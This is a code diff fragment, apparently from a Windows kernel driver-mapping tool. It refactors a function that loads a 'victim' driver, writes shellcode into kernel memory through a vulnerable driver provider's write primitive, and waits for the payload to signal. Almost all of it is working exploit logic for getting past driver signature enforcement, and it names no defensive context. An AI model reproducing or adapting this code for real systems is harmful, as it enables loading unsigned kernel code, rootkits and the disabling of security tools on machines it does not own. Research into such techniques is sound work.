+    _In_ PVOID ImageBase)
 {
     BOOL bSuccess = FALSE;
     ULONG_PTR objectAddress, targetAddress = 0;
@@ -710,13 +481,17 @@ BOOL KDUMapDriver(
     DEVICE_OBJECT deviceObject;
     DRIVER_OBJECT driverObject;
 
-    KDU_PROVIDER* prov = Context->Provider;
+    PVOID pvShellCode;
+
+    KDU_PROVIDER* prov;
 
     ULONG retryCount = 1, maxRetry = 3;
 
     HANDLE victimDeviceHandle = NULL;
 
-    printf_s("[>] Entering %s\r\n", __FUNCTION__);
+    FUNCTION_ENTER_MSG(__FUNCTION__);
+
+    prov = Context->Provider;
 
 Reload:
 
@@ -736,7 +511,7 @@ Reload:
         IDR_PROCEXP,
         &victimDeviceHandle))
     {
-        printf_s("[+] Victim driver loaded, handle %p\r\n", victimDeviceHandle);
+        printf_s("[+] Victim driver loaded, handle 0x%p\r\n", victimDeviceHandle);
     }
     else {
         printf_s("[!] Could not load victim driver, GetLastError %lu\r\n", GetLastError());
@@ -824,21 +599,25 @@ Reload:
 
     if (bSuccess) {
 
-        if (KDUSetupShellCode(Context, lpMapDriverFileName)) {
+        HANDLE sectionHandle = NULL;
 
-            HANDLE readyEventHandle = CreateEventW(NULL, TRUE, FALSE, NULL);
+        pvShellCode = KDUSetupShellCode(Context, ImageBase, &sectionHandle);
+
+        if (pvShellCode) {
+
+            HANDLE readyEventHandle = ScCreateReadyEvent(Context->ShellVersion, pvShellCode);
             if (readyEventHandle) {
-
-                g_ShellCode->ReadyEventHandle = readyEventHandle;
 
                 //
                 // Write shellcode to driver.
                 //
                 if (!prov->Callbacks.WriteKernelVM(Context->DeviceHandle,
                     targetAddress,
-                    g_ShellCode, sizeof(SHELLCODE)))
+                    pvShellCode, 
+                    ScSizeOf(Context->ShellVersion, NULL)))
                 {
                     printf_s("[!] Error writing shellcode to the target driver, abort\r\n");
+                    bSuccess = FALSE;
                 }
                 else {
 
@@ -856,21 +635,42 @@ Reload:
                     //
                     if (WaitForSingleObject(readyEventHandle, 2000) != WAIT_OBJECT_0) {
                         printf_s("[!] Shellcode did not trigger the event within two seconds.\r\n");
+                        bSuccess = FALSE;
+                    }
+                    else
+                    {
+                        KDUShowPayloadResult(Context, sectionHandle);
                     }
                 }
-            }
+
+                CloseHandle(readyEventHandle);
+
+            } //readyEventHandle
             else {
                 printf_s("[!] Error building the ready event handle, abort\r\n");
+                bSuccess = FALSE;
             }
-        }
+
+            if (sectionHandle) {
+                NtClose(sectionHandle);
+            }
+
+        } //pvShellCode
+
         else {
             printf_s("[!] Error while building shellcode, abort\r\n");
+            bSuccess = FALSE;
         }
-    }
+    
+    } //bSuccess
     else {
         printf_s("[!] Error preloading victim driver, abort\r\n");
+        bSuccess = FALSE;
     }
 
+    //
+    // Cleanup.
+    //
     if (victimDeviceHandle)
         NtClose(victimDeviceHandle);
 
@@ -878,7 +678,7 @@ Reload:
         printf_s("[+] Victim driver unloaded\r\n");
     }
 
-    printf_s("[<] Leaving %s\r\n", __FUNCTION__);
+    FUNCTION_LEAVE_MSG(__FUNCTION__);
 
-    return FALSE;
+    return bSuccess;
 }
